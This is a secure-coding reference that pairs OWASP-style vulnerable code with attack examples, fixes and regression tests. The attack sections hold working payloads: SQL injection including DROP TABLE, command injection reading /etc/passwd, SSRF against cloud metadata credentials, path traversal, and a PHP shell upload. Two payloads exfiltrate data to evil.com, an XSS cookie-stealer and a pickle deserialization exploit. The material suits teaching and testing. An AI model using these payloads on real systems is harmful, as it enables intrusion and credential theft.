# Security Testing Examples

Real-world vulnerability examples and test cases for common security issues.

---

## OWASP Top 10 2025 Examples

### A01: Broken Access Control

#### Horizontal Privilege Escalation (IDOR)

**Vulnerable code:**
```python
@app.get("/api/users/{user_id}/profile")
async def get_profile(user_id: int, current_user: User = Depends(get_current_user)):
    # BUG: No check if current_user can access this user_id
    return await db.get_user(user_id)
```

**Attack:**
```bash
# User 123 accessing User 456's profile
curl -H "Authorization: Bearer <user123_token>" \
     https://api.example.com/api/users/456/profile
```

**Fixed code:**
```python
@app.get("/api/users/{user_id}/profile")
async def get_profile(user_id: int, current_user: User = Depends(get_current_user)):
    if user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Access denied")
    return await db.get_user(user_id)
```

**Test case:**
```python
def test_cannot_access_other_user_profile(client, user_token, other_user):
    """User cannot access another user's profile."""
    response = client.get(
        f"/api/users/{other_user.id}/profile",
        headers={"Authorization": f"Bearer {user_token}"}
    )
    assert response.status_code == 403
```

---

#### Vertical Privilege Escalation

**Vulnerable code:**
```javascript
// Frontend hides admin button, but API doesn't check
app.delete('/api/users/:id', async (req, res) => {
    await User.findByIdAndDelete(req.params.id);
    res.json({ message: 'User deleted' });
});
```

**Attack:**
```bash
# Regular user deleting admin account
curl -X DELETE -H "Authorization: Bearer <regular_user_token>" \
     https://api.example.com/api/users/admin-id
```

**Fixed code:**
```javascript
app.delete('/api/users/:id', requireRole('admin'), async (req, res) => {
    await User.findByIdAndDelete(req.params.id);
    res.json({ message: 'User deleted' });
});
```

**Test case:**
```javascript
test('regular user cannot delete users', async () => {
    const response = await request(app)
        .delete('/api/users/some-user-id')
        .set('Authorization', `Bearer ${regularUserToken}`);

    expect(response.status).toBe(403);
});
```

---

#### SSRF (Server-Side Request Forgery)

**Vulnerable code:**
```python
@app.post("/api/fetch-url")
async def fetch_url(url: str):
    # BUG: No validation, can access internal services
    response = requests.get(url)
    return {"content": response.text}
```

**Attack:**
```bash
# Accessing internal metadata service (AWS)
curl -X POST https://api.example.com/api/fetch-url \
     -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Accessing internal services
curl -X POST https://api.example.com/api/fetch-url \
     -d '{"url": "http://internal-admin-panel.local/admin/users"}'
```

**Fixed code:**
```python
import ipaddress
from urllib.parse import urlparse

BLOCKED_HOSTS = ['169.254.169.254', 'metadata.google.internal', 'localhost', '127.0.0.1']
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.hostname in BLOCKED_HOSTS:
        return False
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False
    except ValueError:
        pass  # Not an IP address
    return True

@app.post("/api/fetch-url")
async def fetch_url(url: str):
    if not is_safe_url(url):
        raise HTTPException(status_code=400, detail="URL not allowed")
    response = requests.get(url, allow_redirects=False)
    return {"content": response.text}
```

---

### A03: Software Supply Chain Failures

#### Malicious Dependency

**Vulnerable package.json:**
```json
{
    "dependencies": {
        "lodash": "^4.17.0",
        "event-stream": "3.3.6"  // Compromised version!
    }
}
```

**Detection with npm audit:**
```bash
$ npm audit
# High: Malicious Package - event-stream
# Versions affected: 3.3.6
# More info: https://npmjs.com/advisories/737
```

**Fixed approach:**
```json
{
    "dependencies": {
        "lodash": "4.17.21",
        "highland": "^2.13.5"  // Alternative to event-stream
    }
}
```

**Lockfile integrity verification:**
```bash
# Verify package integrity
npm ci --ignore-scripts  # Use lockfile, no scripts

# Check for known vulnerabilities
npm audit --audit-level=critical
snyk test
```

---

### A04: Cryptographic Failures

#### Weak Password Hashing

**Vulnerable code:**
```python
import hashlib

def hash_password(password: str) -> str:
    # BUG: MD5 is not suitable for passwords
    return hashlib.md5(password.encode()).hexdigest()
```

**Attack:**
```python
# Rainbow table lookup or hashcat
# MD5 of "password123" = 482c811da5d5b4bc6d497ffa98491e38
# Cracked in seconds with modern hardware
```

**Fixed code:**
```python
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=["argon2", "bcrypt"], deprecated="auto")

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)
```

**Test case:**
```python
def test_password_hashing_is_secure():
    """Password should be hashed with strong algorithm."""
    password = "test_password_123"
    hashed = hash_password(password)

    # Should not be recognizable hash
    assert not hashed.startswith("$1$")   # Not MD5
    assert not hashed.startswith("$2y$")  # Not weak bcrypt

    # Should use argon2 or bcrypt
    assert hashed.startswith("$argon2") or hashed.startswith("$2b$")

    # Same password should produce different hashes (salted)
    hashed2 = hash_password(password)
    assert hashed != hashed2
```

---

#### Sensitive Data Exposure

**Vulnerable code:**
```python
import logging

logger = logging.getLogger(__name__)

def process_payment(card_number: str, cvv: str, amount: float):
    logger.info(f"Processing payment: card={card_number}, cvv={cvv}, amount={amount}")
    # Process payment...
```

**Fixed code:**
```python
import logging

logger = logging.getLogger(__name__)

def mask_card(card_number: str) -> str:
    return f"****-****-****-{card_number[-4:]}"

def process_payment(card_number: str, cvv: str, amount: float):
    logger.info(f"Processing payment: card={mask_card(card_number)}, amount={amount}")
    # Never log CVV
    # Process payment...
```

**Test case:**
```python
def test_sensitive_data_not_logged(caplog):
    """Card numbers and CVVs should never appear in logs."""
    with caplog.at_level(logging.DEBUG):
        process_payment("4111111111111111", "123", 99.99)

    log_output = caplog.text
    assert "4111111111111111" not in log_output
    assert "123" not in log_output
    assert "****-****-****-1111" in log_output  # Masked version is OK
```

---

### A05: Injection

#### SQL Injection

**Vulnerable code:**
```python
@app.get("/api/users")
async def search_users(search: str, db: Session = Depends(get_db)):
    # BUG: String concatenation allows SQL injection
    query = f"SELECT * FROM users WHERE name LIKE '%{search}%'"
    return db.execute(query).fetchall()
```

**Attack:**
```bash
# Extract all users
curl "https://api.example.com/api/users?search=' OR '1'='1"

# Drop table
curl "https://api.example.com/api/users?search='; DROP TABLE users;--"

# Extract password hashes
curl "https://api.example.com/api/users?search=' UNION SELECT username, password FROM users--"
```

**Fixed code:**
```python
from sqlalchemy import text

@app.get("/api/users")
async def search_users(search: str, db: Session = Depends(get_db)):
    # Parameterized query
    query = text("SELECT * FROM users WHERE name LIKE :search")
    return db.execute(query, {"search": f"%{search}%"}).fetchall()
```

**Test cases:**
```python
@pytest.mark.parametrize("payload", [
    "'; DROP TABLE users;--",
    "' OR '1'='1",
    "admin'--",
    "1; SELECT * FROM users",
    "' UNION SELECT * FROM users--",
])
def test_sql_injection_prevented(client, payload):
    """SQL injection payloads should not work."""
    response = client.get(f"/api/users?search={payload}")
    # Should not return all users or cause error
    assert response.status_code in [200, 400]
    if response.status_code == 200:
        # Should return empty or filtered results, not all data
        assert len(response.json()) < 100
```

---

#### Command Injection

**Vulnerable code:**
```python
import subprocess

@app.post("/api/convert")
async def convert_image(filename: str):
    # BUG: Shell injection via filename
    result = subprocess.run(
        f"convert uploads/{filename} output/{filename}.png",
        shell=True,
        capture_output=True
    )
    return {"status": "converted"}
```

**Attack:**
```bash
curl -X POST https://api.example.com/api/convert \
     -d '{"filename": "image.jpg; cat /etc/passwd > output/passwd.txt"}'
```

**Fixed code:**
```python
import subprocess
import re

SAFE_FILENAME_PATTERN = re.compile(r'^[\w\-\.]+$')

@app.post("/api/convert")
async def convert_image(filename: str):
    if not SAFE_FILENAME_PATTERN.match(filename):
        raise HTTPException(status_code=400, detail="Invalid filename")

    # No shell, arguments as list
    result = subprocess.run(
        ["convert", f"uploads/{filename}", f"output/{filename}.png"],
        capture_output=True
    )
    return {"status": "converted"}
```

---

#### XSS (Cross-Site Scripting)

**Vulnerable code:**
```javascript
// React - dangerouslySetInnerHTML without sanitization
function Comment({ content }) {
    return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
```

**Attack:**
```javascript
// Stored XSS payload
const maliciousContent = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
```

**Fixed code:**
```javascript
import DOMPurify from 'dompurify';

function Comment({ content }) {
    const sanitized = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
        ALLOWED_ATTR: ['href']
    });
    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Or better - avoid dangerouslySetInnerHTML entirely
function Comment({ content }) {
    return <div>{content}</div>;  // React auto-escapes
}
```

**Test cases:**
```python
@pytest.mark.parametrize("payload,should_be_escaped", [
    ("<script>alert('xss')</script>", True),
    ("<img src=x onerror=alert(1)>", True),
    ("javascript:alert('xss')", True),
    ("<svg onload=alert(1)>", True),
    ("{{constructor.constructor('alert(1)')()}}", True),  # Template injection
])
def test_xss_prevented(client, auth_token, payload, should_be_escaped):
    """XSS payloads should be escaped or rejected."""
    response = client.post(
        "/api/comments",
        json={"content": payload},
        headers={"Authorization": f"Bearer {auth_token}"}
    )

    if response.status_code == 201:
        saved = response.json()["content"]
        # Script tags should be escaped or removed
        assert "<script>" not in saved
        assert "onerror=" not in saved.lower()
        assert "javascript:" not in saved.lower()
```

---

### A07: Authentication Failures

#### Session Fixation

**Vulnerable code:**
```python
@app.post("/login")
async def login(username: str, password: str, session: Session):
    user = authenticate(username, password)
    if user:
        # BUG: Session ID not regenerated after login
        session["user_id"] = user.id
        return {"message": "Logged in"}
```

**Attack:**
1. Attacker creates session: `SESSION_ID=abc123`
2. Attacker sends victim link: `https://app.com?session=abc123`
3. Victim logs in using that session
4. Attacker now has authenticated session `abc123`

**Fixed code:**
```python
from itsdangerous import URLSafeTimedSerializer

@app.post("/login")
async def login(username: str, password: str, response: Response):
    user = authenticate(username, password)
    if user:
        # Generate new session ID on login
        session_id = secrets.token_urlsafe(32)
        await session_store.create(session_id, {"user_id": user.id})

        response.set_cookie(
            "session_id",
            session_id,
            httponly=True,
            secure=True,
            samesite="strict"
        )
        return {"message": "Logged in"}
```

---

#### Brute Force Attack

**Vulnerable code:**
```python
@app.post("/login")
async def login(username: str, password: str):
    # No rate limiting
    user = await db.get_user_by_username(username)
    if user and verify_password(password, user.password_hash):
        return create_token(user)
    raise HTTPException(status_code=401)
```

**Fixed code:**
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

# Track failed attempts per account
failed_attempts = {}

@app.post("/login")
@limiter.limit("5/minute")
async def login(request: Request, username: str, password: str):
    # Check if account is locked
    if failed_attempts.get(username, 0) >= 5:
        raise HTTPException(status_code=423, detail="Account temporarily locked")

    user = await db.get_user_by_username(username)
    if user and verify_password(password, user.password_hash):
        failed_attempts.pop(username, None)
        return create_token(user)

    # Track failed attempt
    failed_attempts[username] = failed_attempts.get(username, 0) + 1
    raise HTTPException(status_code=401)
```

**Test case:**
```python
@pytest.mark.asyncio
async def test_brute_force_protection(client):
    """Account should be locked after multiple failed attempts."""
    for i in range(6):
        response = client.post("/login", json={
            "username": "victim",
            "password": "wrong_password"
        })

    # Should be locked or rate limited
    assert response.status_code in [423, 429]
```

---

### A08: Software/Data Integrity Failures

#### Insecure Deserialization

**Vulnerable code:**
```python
import pickle
import base64

@app.post("/api/restore-session")
async def restore_session(data: str):
    # BUG: Pickle can execute arbitrary code
    session_data = pickle.loads(base64.b64decode(data))
    return {"user_id": session_data["user_id"]}
```

**Attack:**
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl https://evil.com/pwned?data=$(cat /etc/passwd | base64)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Send payload to /api/restore-session
```

**Fixed code:**
```python
import json
import jwt

@app.post("/api/restore-session")
async def restore_session(token: str):
    try:
        # Use JWT with signature verification
        session_data = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return {"user_id": session_data["user_id"]}
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401)
```

---

## Secret Detection Examples

### Hardcoded API Keys

**Vulnerable code:**
```python
# config.py
STRIPE_API_KEY = "sk_live_EXAMPLE_KEY_REPLACE_ME"  # Real production key!
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

**Detection:**
```bash
# TruffleHog
$ trufflehog git file://.
Found verified result
Detector: Stripe
Raw result: sk_live_EXAMPLE_KEY_REPLACE_ME

# Gitleaks
$ gitleaks detect
Finding: AWS Access Key ID
File: config.py
Line: 3
```

**Fixed code:**
```python
# config.py
import os

STRIPE_API_KEY = os.environ["STRIPE_API_KEY"]
AWS_ACCESS_KEY = os.environ["AWS_ACCESS_KEY_ID"]
AWS_SECRET_KEY = os.environ["AWS_SECRET_ACCESS_KEY"]
```

---

### Secrets in Git History

**Problem:**
```bash
# Developer committed a secret, then removed it
$ git log -p --all -S "password" -- config.py
commit abc123
-DATABASE_PASSWORD = "super_secret_prod_password"
+DATABASE_PASSWORD = os.environ["DB_PASSWORD"]
```

**Detection:**
```bash
# Scan full git history
$ trufflehog git file://. --since-commit HEAD~100
$ gitleaks detect --log-opts="--all"
```

**Remediation:**
```bash
# 1. Rotate the exposed secret immediately
# 2. Remove from git history (if necessary)
git filter-branch --force --index-filter \
    "git rm --cached --ignore-unmatch config.py" \
    --prune-empty --tag-name-filter cat -- --all

# 3. Or use BFG Repo-Cleaner
bfg --replace-text passwords.txt
git reflog expire --expire=now --all && git gc --prune=now --aggressive
```

---

## Input Validation Examples

### Path Traversal

**Vulnerable code:**
```python
@app.get("/api/files/{filename}")
async def get_file(filename: str):
    # BUG: No path validation
    file_path = f"uploads/{filename}"
    return FileResponse(file_path)
```

**Attack:**
```bash
curl "https://api.example.com/api/files/../../etc/passwd"
curl "https://api.example.com/api/files/..%2F..%2Fetc%2Fpasswd"
curl "https://api.example.com/api/files/....//....//etc/passwd"
```

**Fixed code:**
```python
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads").resolve()

@app.get("/api/files/{filename}")
async def get_file(filename: str):
    # Resolve and validate path
    file_path = (UPLOAD_DIR / filename).resolve()

    # Ensure file is within allowed directory
    if not str(file_path).startswith(str(UPLOAD_DIR)):
        raise HTTPException(status_code=400, detail="Invalid filename")

    if not file_path.exists():
        raise HTTPException(status_code=404)

    return FileResponse(file_path)
```

**Test cases:**
```python
@pytest.mark.parametrize("payload", [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%afetc/passwd",
])
def test_path_traversal_blocked(client, auth_token, payload):
    """Path traversal attempts should be blocked."""
    response = client.get(
        f"/api/files/{payload}",
        headers={"Authorization": f"Bearer {auth_token}"}
    )
    assert response.status_code in [400, 404]
    # Should never return /etc/passwd content
    if response.status_code == 200:
        assert "root:" not in response.text
```

---

### File Upload Validation

**Vulnerable code:**
```python
@app.post("/api/upload")
async def upload_file(file: UploadFile):
    # BUG: No validation of file type
    content = await file.read()
    with open(f"uploads/{file.filename}", "wb") as f:
        f.write(content)
    return {"filename": file.filename}
```

**Attack:**
```bash
# Upload PHP shell disguised as image
curl -X POST https://api.example.com/api/upload \
     -F "file=@shell.php;filename=image.jpg.php"
```

**Fixed code:**
```python
import magic
from pathlib import Path
import uuid

ALLOWED_MIMES = ["image/jpeg", "image/png", "image/gif", "application/pdf"]
ALLOWED_EXTENSIONS = [".jpg", ".jpeg", ".png", ".gif", ".pdf"]
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

@app.post("/api/upload")
async def upload_file(file: UploadFile):
    # Check file size
    content = await file.read()
    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail="File too large")

    # Validate extension
    ext = Path(file.filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(status_code=400, detail="Invalid file type")

    # Validate actual content type using magic bytes
    mime_type = magic.from_buffer(content, mime=True)
    if mime_type not in ALLOWED_MIMES:
        raise HTTPException(status_code=400, detail="Invalid file content")

    # Generate safe filename
    safe_filename = f"{uuid.uuid4()}{ext}"

    with open(f"uploads/{safe_filename}", "wb") as f:
        f.write(content)

    return {"filename": safe_filename}
```

---

## Rate Limiting Examples

### API Rate Limiting

**Test case:**
```python
import asyncio
from httpx import AsyncClient

@pytest.mark.asyncio
async def test_rate_limiting_enforced():
    """API should enforce rate limits."""
    async with AsyncClient(base_url="http://localhost:8000") as client:
        # Send 100 requests rapidly
        tasks = [client.get("/api/public") for _ in range(100)]
        responses = await asyncio.gather(*tasks)

        status_codes = [r.status_code for r in responses]

        # Some requests should be rate limited
        rate_limited = status_codes.count(429)
        assert rate_limited > 0, "Rate limiting not enforced"

@pytest.mark.asyncio
async def test_login_rate_limiting():
    """Login endpoint should have strict rate limits."""
    async with AsyncClient(base_url="http://localhost:8000") as client:
        responses = []
        for i in range(20):
            response = await client.post("/api/auth/login", json={
                "email": "test@example.com",
                "password": "wrong"
            })
            responses.append(response.status_code)

        # Should be rate limited within 20 attempts
        assert 429 in responses, "Login rate limiting too permissive"
```

---

## Security Headers Examples

### Missing Security Headers

**Test case:**
```python
def test_security_headers_present(client):
    """Critical security headers should be present."""
    response = client.get("/")
    headers = response.headers

    # Must have
    assert headers.get("X-Content-Type-Options") == "nosniff"
    assert headers.get("X-Frame-Options") in ["DENY", "SAMEORIGIN"]
    assert "Strict-Transport-Security" in headers

    # Should have
    assert "Content-Security-Policy" in headers
    assert headers.get("X-XSS-Protection") == "1; mode=block"
    assert headers.get("Referrer-Policy") in [
        "no-referrer",
        "strict-origin-when-cross-origin"
    ]

def test_cors_configuration(client):
    """CORS should not allow all origins."""
    response = client.options(
        "/api/data",
        headers={"Origin": "https://evil.com"}
    )

    # Should not allow arbitrary origins
    assert response.headers.get("Access-Control-Allow-Origin") != "*"
    assert response.headers.get("Access-Control-Allow-Origin") != "https://evil.com"
```

---

*These examples demonstrate common vulnerabilities and their fixes. Adapt patterns to your specific framework and language.*
